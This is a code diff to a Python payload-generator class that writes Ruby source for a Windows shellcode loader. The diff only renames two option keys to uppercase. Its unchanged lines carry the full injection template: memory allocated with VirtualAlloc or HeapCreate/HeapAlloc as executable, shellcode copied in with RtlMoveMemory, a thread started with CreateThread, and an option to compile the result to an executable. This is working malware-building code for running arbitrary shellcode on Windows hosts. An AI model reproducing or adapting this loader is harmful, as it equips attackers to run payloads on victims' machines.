@@ -26,8 +26,10 @@ class Payload:
         self.shellcode = shellcode.Shellcode()
 
         # options we require user ineraction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "inject_method" : ["Virtual", "Virtual, or Heap"]}
+        self.required_options = {
+                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    "INJECT_METHOD"  : ["Virtual", "Virtual, or Heap"]
+                                }
 
     def generate(self):
 
@@ -44,13 +46,13 @@ class Payload:
         payloadCode += "include Win32\n"
         payloadCode += "exit if Object.const_defined?(:Ocra)\n"
 
-        if self.required_options["inject_method"][0].lower() == "virtual":
+        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payloadCode += "v = API.new('VirtualAlloc', 'IIII', 'I');r = API.new('RtlMoveMemory', 'IPI', 'V');c = API.new('CreateThread', 'IIIIIP', 'I');w = API.new('WaitForSingleObject', 'II', 'I')\n"
             payloadCode += "%s = \"%s\"\n" %(payloadName, Shellcode)
             payloadCode += "%s = v.call(0,(%s.length > 0x1000 ? %s.length : 0x1000), 0x1000, 0x40)\n" %(ptrName,payloadName,payloadName)
             payloadCode += "x = r.call(%s,%s,%s.length); %s = c.call(0,0,%s,0,0,0); x = w.call(%s,0xFFFFFFF)\n" %(ptrName,payloadName,payloadName,threadName,ptrName,threadName)
 
-        elif self.required_options["inject_method"][0].lower() == "heap":
+        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
             payloadCode += "v = API.new('HeapCreate', 'III', 'I');q = API.new('HeapAlloc', 'III', 'I');r = API.new('RtlMoveMemory', 'IPI', 'V');c = API.new('CreateThread', 'IIIIIP', 'I');w = API.new('WaitForSingleObject', 'II', 'I')\n"
             payloadCode += "%s = \"%s\"\n" %(payloadName, Shellcode)
             payloadCode += "%s = v.call(0x0004,(%s.length > 0x1000 ? %s.length : 0x1000), 0)\n" %(heap_name,payloadName,payloadName)
